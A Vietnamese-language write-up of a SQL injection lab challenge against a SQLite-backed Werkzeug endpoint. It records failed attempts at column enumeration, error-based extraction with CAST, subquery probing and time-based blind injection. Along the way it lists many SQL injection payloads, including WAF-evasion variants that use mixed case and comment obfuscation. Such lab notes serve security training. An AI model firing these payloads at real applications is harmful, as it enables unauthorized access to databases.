
# SQL Injection Lab Write-up

---

## Mục lục
1. [Tổng quan môi trường](#1-tổng-quan-môi-trường)  
2. [Bước 1: Xác nhận điểm tiêm (Injection Point)](#2-bước-1-xác-nhận-điểm-tiêm-injection-point)  
3. [Bước 2: Dò số cột bằng `ORDER BY`](#3-bước-2-dò-số-cột-bằng-order-by)  
4. [Bước 3: Bỏ qua `UNION` – Thử Error-based với `CAST`](#4-bước-3-bỏ-qua-union--thử-error-based-với-cast)  
5. [Bước 4: Thử `GROUP BY`, `HAVING`, `EXISTS` + Subquery](#5-bước-4-thử-group-by-having-exists--subquery)  
6. [Bước 5: Thử Time-based Blind](#6-bước-5-thử-time-based-blind)

---

## 1. Tổng quan môi trường

| Thành phần | Chi tiết |
|---:|---|
| **Server** | `Werkzeug/3.1.3 Python/3.11.13` |
| **DBMS** | **SQLite** (xác nhận qua lỗi `sqlite3.OperationalError`) |
| **Response lỗi mặc định** | `HTTP 500` + `DB error: (0, '')` |
| **Điểm tiêm** | `GET /ch1-sqli?id=...` |
| **WAF** | **Có** – chặn `UNION`, `ORDER BY` (khi không hợp lệ), ẩn toàn bộ chi tiết lỗi |

---

## 2. Bước 1: Xác nhận điểm tiêm (Injection Point)

### Payload thử
```http
?id=1
?id=1'
?id=1'--
?id=999... (chuỗi dài)
?id=null
?id=
?id=0
?id=1-1
````

### Kết quả

Tất cả trả về:

```http
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: Werkzeug/3.1.3 Python/3.11.13
Content-Type: text/html; charset=utf-8
Content-Length: 17
Connection: close

DB error: (0, '')
```

### Kết luận

* Có SQL Injection.
* **Không có input nào trả về `200 OK`.**
* Query **luôn lỗi** → không thể dùng UNION-based thông thường.

---

## 3. Bước 2: Dò số cột bằng `ORDER BY`

### Payload

```sql
?id=1 ORDER BY 1--
?id=1 ORDER BY 2--
...
?id=1 ORDER BY 10--
```

### Obfuscation ví dụ

```sql
?id=1/**/OrDeR/**/By/**/1--
?id=1 order by 1%23
```

### Kết quả

* Không có sự thay đổi về:

  * Status code
  * `Content-Length`
  * Response time
  * Error message

### Kết luận

* `ORDER BY` **không được thực thi** hoặc **bị WAF chặn**.
* **Không thể dò số cột theo cách truyền thống.**

---

## 4. Bước 3: Bỏ qua `UNION` – Thử Error-based với `CAST`

### Payload

```sql
?id=1 AND 1=CAST((SELECT sqlite_version()) AS INTEGER)--
?id=1 AND 1=CAST((SELECT tbl_name FROM sqlite_master LIMIT 0,1) AS INTEGER)--
```

### Obfuscation tối đa (ví dụ)

```sql
?id=1/**/AnD/**/1=CaSt((SeLeCt/**/sqlite_version())/**/aS/**/iNtEgEr)--
?id=1/**/AnD/**/1=CaSt((SeLeCt/**/ChAr(115,113,108,105,116,101,95,118,101,114,115,105,111,110)())/**/aS/**/iNtEgEr)--
```

### Kết quả

* Error message không thay đổi: `DB error: (0, '')`
* Backend ẩn 100% chi tiết lỗi.

### Kết luận

* **Error-based injection thất bại.**
* WAF hoặc backend **sanitize/ẩn output hoàn toàn**.

---

## 5. Bước 4: Thử `GROUP BY`, `HAVING`, `EXISTS` + Subquery

| Payload                                                        | Mục đích          |
| -------------------------------------------------------------- | ----------------- |
| `?id=1 GROUP BY 1,2,3--`                                       | Dò số cột         |
| `?id=1 AND EXISTS(SELECT 1 FROM (SELECT 1,2,3)a ORDER BY 3)--` | Dò trong subquery |

### Kết quả

* Không có sự khác biệt về response.

### Kết luận

* Các cấu trúc phức tạp **bị chặn hoặc không thực thi**.

---

## 6. Bước 5: Thử Time-based Blind

### Payload thử

```sql
?id=1 AND 1=1 AND (SELECT 1 FROM (SELECT randomblob(1000000)))--
?id=1 AND 1=2 AND (SELECT 1 FROM (SELECT randomblob(1000000)))--
```

### Kết quả

* Không có delay đáng kể (< 1s).
* `randomblob()` **không hoạt động** hoặc **bị disable**.

### Thử thay thế

* `strftime('%s','now')`
* `CASE WHEN ... THEN 1 ELSE randomblob(...) END`

→ Vẫn không thấy delay.

### Kết luận

* **Time-based blind không khả thi.**

---
